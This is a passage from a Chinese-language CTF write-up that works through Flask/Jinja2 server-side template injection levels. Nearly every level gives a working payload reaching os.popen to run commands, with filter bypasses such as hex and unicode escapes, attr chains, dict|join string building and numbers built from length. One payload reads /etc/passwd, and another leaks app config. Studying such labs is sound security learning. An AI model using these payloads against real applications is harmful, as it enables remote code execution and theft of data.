        except :
            pass
windows环境反引号没有用，所以本地抓取不到信息
## level 4
过滤了中括号
> **getitem** ()
> 是python的一个魔法方法,当对列表使用时,传入整数返回列表对应索引的值;对字典使用时,传入字符串,返回字典相应键所对应的值.
`{{"".__class__.__base__.__subclasses__()[139].__init__.__globals__.__getitem__('popen')('type
flag').read()}}`
## level 5
过滤了了引号和双引号  
`request.args`
> 在搭建flask时,大多数程序内部都会使用 flask的request来解析get请求.此出我们就可以通过构造带参数的url,配合
> request.args 获取构造参数的内容来绕过限制
POST：  
`{{().__class__.__base__.__subclasses__()[132].__init__.__globals__[request.args.a](request.args.b).read()}}`  
GET：  
`a=popen&b=type flag`  
​
​
## level 6
过滤了`_`  
用过滤器绕过`| attr()`  
关于过滤器;
>   1. 过滤器通过管道符号（|）与变量连接,并且在括号中可能有可选的参数
>   2. 可以链接到多个过滤器.一个滤波器的输出将应用于下一个过滤器.
>
经常使用的的过滤器：
    length() # 获取一个序列或者字典的长度并将其返回
    int()：# 将值转换为int类型；
    float()：# 将值转换为float类型；
    lower()：# 将字符串转换为小写；
    upper()：# 将字符串转换为大写；
    reverse()：# 反转字符串；
    replace(value,old,new)： # 将value中的old替换为new
    list()：# 将变量转换为列表类型；
    string()：# 将变量转换成字符串类型；
    join()：# 将一个序列中的参数值拼接成字符串,通常有python内置的dict()配合使用
    attr(): # 获取对象的属性
`_`的十六进制编码为`\x5f`
所以`__class__`可以写成`\x5f\x5fclass\x5f\x5f`  
​
因为我们需要用十六进制编码`_`,而编码过后的`_`不能和`.`直接相连，这个时候就需要过滤器和`_`连接了,所以`foo|attr("bar")=foo.bar`  
十六进制编码和Unicode编码都可以，以及base64编码和rot13等编码去绕过。  
payload:
    ().__class__.__base__.__subclasses__()[139].__init__.__globals__['popen']('type flag').read()
    # 编码后
    {{()|attr("\x5f\x5fclass\x5f\x5f")|attr("\x5f\x5fbase\x5f\x5f")|attr("\x5f\x5fsubclasses\x5f\x5f")()|attr("\x5f\x5fgetitem\x5f\x5f")(139)|attr("\x5f\x5finit\x5f\x5f")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")('popen')('type flag')|attr("read")()}}
    # base64  未绕过成功
    {{()|attr("\x5f\x5fclass\x5f\x5f")|attr("\x5f\x5fbase\x5f\x5f")|attr("\x5f\x5fsubclasses\x5f\x5f")()|attr("\x5f\x5fgetitem\x5f\x5f")(139)|attr("\x5f\x5finit\x5f\x5f")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")('popen')('dHlwZSBmbGFn'.decode('base64'))|attr("read")()}}
    这里面展示一个unioncode编码 未绕过成功
    {{()|attr("__class__")|attr("__base__")|attr("__subclasses__")()|attr("__getitem__")(139)|attr("__init__")|attr("__globals__")|attr("__getitem__")("os")|attr("popen")("dir")|attr("read")()}}
    {{()|attr("\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f")|attr("\u005f\u005f\u0062\u0061\u0073\u0065\u005f\u005f")|attr("\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f")()|attr("\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f")(139)|attr("\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f")|attr("\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f")|attr("\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f")("os")|attr("popen")("dir")|attr("read")()}}
## level 7
过滤了`.`，可以使用`[]`绕过。
`python语法除了可以使用点 .来访问对象属性外,还可以使用中括号[].同样也可以使用**getitem**
``{{()['__class__']['__base__']['__subclasses__']()[139]['__init__']['__globals__']['popen']('cat
flag')['read']()}}`
## level 8
过滤了关键字
关键字过滤，最简单的办法就是字符串拼接，比如'`class'`可以写成`'cla''ss'`
**其他方法**
1编码  
2在jinjia2语法中~可以进行连接，比如：{`%set a="__cla"%}{%set aa="ss__%}{{a~aa}}`  
3使用join过滤器.例如使用`{%set
a=dict(__cla=a,ss__=a)|join%}{{a}}`会将`__cla和ss__`拼接在一起,或者`{%set
a=['__cla','ss__']|join%}{{a}}`  
4使用`reverse`过滤器.如`{%set a="__ssalc__"|reverse%}{{a}}`  
5使用`replace`过滤器.如`{%set a="__claee__"|replace("ee","ss")%}{{a}}`  
6使用python中的`char()`
​
    {% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %}{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)%2bchr(101)%2bchr(116)%2bchr(99)%2bchr(47)%2bchr(112)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(119)%2bchr(100)).read()}}
​
## level 9
过滤数字
`__subclasses__()[139]`,我们要塑造139这个数字  
使用过滤器`|length`，来塑造。  
`{%set a='aaaaaaaaaaaa'|length*'aaaaaaaaaaa'|length+'aaaaaaa'|length %}{{a}}`  
// 12*11+7=139  
​
`{% set a='aaaaaaaaaaaa'|length*'aaaaaaaaaaa'|length+'aaaaaaa'|length
%}{{"".__class__.__base__.__subclasses__()[a].__init__.__globals__['popen']('type
flag').read()}}`
## level 10
过滤了全局变量  
没有了全局变量  
{{config}}/{{self}}  
均被ban掉,所以得重新寻找一个储存相关信息的变量  
发现存在这么一个变量current_app是我们需要的，官网对`current_app`提供了这么一句说明
> `应用上下文会在必要时被创建和销毁。它不会在线程间移动，并且也不会在不同的请求之间共享。正因为如此，它是一个存储数据库连接信息或是别的东西的最佳位置。`
payload：  
`{{url_for.__globals__['current_app'].config}}
{{get_flashed_messages.__globals__['current_app'].config}}`  
拿到{{config}}
## level 11
过滤了`'\'', '"', '+', 'request', '.', '[', ']'`  
过滤的`[]`可以通过`__getitem__`绕过，`.`可以通过`attr`绕过，`'
"`可以通过request构造参数代替，但是request被ban了  
所以关键就是如何构造`' "`
> 在Level 9 bypass keyword 的扩展中,使用过滤器dict()|join构造关键子的过程中没有出现' ",可以使用这种办法绕过.
`{%set a=dict(__cla=a,ss__=b)|join%}{{()|attr(a)}}`
但是，这里的弊端就是构造命令 `cat flag`的时候，空格无法识别，所以要如何绕过空格呢？  
师傅的思路是这样的：
>
> 通过以下构造可以得到字符串,举个例,可以发现输出的字符串中存在空格、部分数字、  ​
    {% set org = ({ }|select()|string()) %}{{org}}
    {% set org = (self|string()) %}{{org}}
    {% set org = self|string|urlencode %}{{org}}
    {% set org = (app.__doc__|string) %}{{org}}
本地演示一下
当使用urlencode的时候还会出现`%`，当其被过滤的时候可以使用。  
构造payload
    原型payload：
    ().__class__.__base__.__subclasses__()[139].__init__.__globals__['popen']('type flag').read()
    构造：
    {%set a=dict(__cla=a,ss__=b)|join %}# __class__
    {%set b=dict(__bas=a,e__=b)|join %}# __base__
    {%set c=dict(__subcla=a,sses__=b)|join %}# __subclasses__
    {%set d=dict(__ge=a,titem__=a)|join%}# __getitem__
    {%set e=dict(__in=a,it__=b)|join %}# __init__
    {%set f=dict(__glo=a,bals__=b)|join %}# __globals__
    {%set g=dict(pop=a,en=b)|join %}# popen
    {%set h=self|string|attr(d)(18)%}# 空格
    {%set i=(dict(type=abc)|join,h,dict(flag=b)|join)|join%}# type flag
    {%set j=dict(read=a)|join%}# read
    {{()|attr(a)|attr(b)|attr(c)()|attr(d)(139)|attr(e)|attr(f)|attr(d)(g)(i)|attr(j)()}}# 拼接
## level 12
和上一关的区别就是，没有过滤`request`，但是过滤了数字。可以通过`request.args`传参绕过。
>
> 不过`request|attr("args")|attr("a")`并不能获取到通过get传递过来的a参数,所以这里得跟换为`request.args.get()`来获取get参数
但是一个个构造太长了  
所以从羽师傅那里找到一条简短的构造链  
`{{x.__init__.__globals__['__builtins__']}}`
构造payload
    get:
    ?z=__init__&zz=__globals__&zzz=__builtins__&zzzz=eval&zzzzz=__import__('os').popen('type flag').read()
    post:
    {%set a={}|select|string|list%}
    {%set b=dict(pop=a)|join%}
    {%set c=a|attr(b)(self|string|length)%}  
    {%set d=(c,c,dict(getitem=a)|join,c,c)|join%} 
    {%set e=dict(args=a)|join%}   
    {%set f=dict(get=a)|join%}    
    {%set g=dict(z=a)|join%}        
    {%set gg=dict(zz=a)|join%}
    {%set ggg=dict(zzz=a)|join%}
    {%set gggg=dict(zzzz=a)|join%}
    {%set ggggg=dict(zzzzz=a)|join%}
    {{x|attr(request|attr(e)|attr(f)(g))|attr(request|attr(e)|attr(f)(gg))|attr(d)(request|attr(e)|attr(f)(ggg))|attr(d)(request|attr(e)|attr(f)(gggg))(request|attr(e)|attr(f)(ggggg))}}
## level 13
比上面过滤的更多关键字，但是我们依然可以使用上一关的思路  
payload
    {%set a={}|select|string|list%}
    {%set ax={}|select|string|list%}
    {%set aa=dict(ssss=a)|join%}
    {%set aaa=dict(ssssss=a)|join%}
    {%set aaaa=dict(ss=a)|join%}
    {%set aaaaa=dict(sssss=a)|join%}
    {%set b=dict(pop=a)|join%}   # pop
    {%set c=a|attr(b)(aa|length*aaa|length)%}  # _
    {%set cc=a|attr(b)(aaaa|length*aaaaa|length)%} # 空格
    {%set d=(c,c,dict(get=a,item=a)|join,c,c)|join%}  # __getitem__
    {%set dd=(c,c,dict(in=a,it=a)|join,c,c)|join%}   # __init__
    {%set ddd=(c,c,dict(glob=a,als=a)|join,c,c)|join%}   # __globals__
    {%set dddd=(c,c,dict(buil=a,tins=a)|join,c,c)|join%}   # __builtins__
    {%set e=(c,c,dict(impo=a,rt=a)|join,c,c)|join%}   # __import__
    {%set ee=(dict(o=a,s=a)|join)|join%}   # os
    {%set eee=(dict(po=a,pen=a)|join)|join%}  # popen
    {%set eeee=(dict(type=a)|join,cc,dict(flag=a)|join)|join%}  # type flag
    {%set f=(dict(rea=a,d=a)|join)|join%}  # read
    {{x|attr(dd)|attr(ddd)|attr(d)(dddd)|attr(d)(e)(ee)|attr(eee)(eeee)|attr(f)()}}
# 总结
这次总算是把flask框架的SSTI注入给弄的差不多了，以后遇见了也不会手忙脚乱了。继续加油吧！！！
# 参考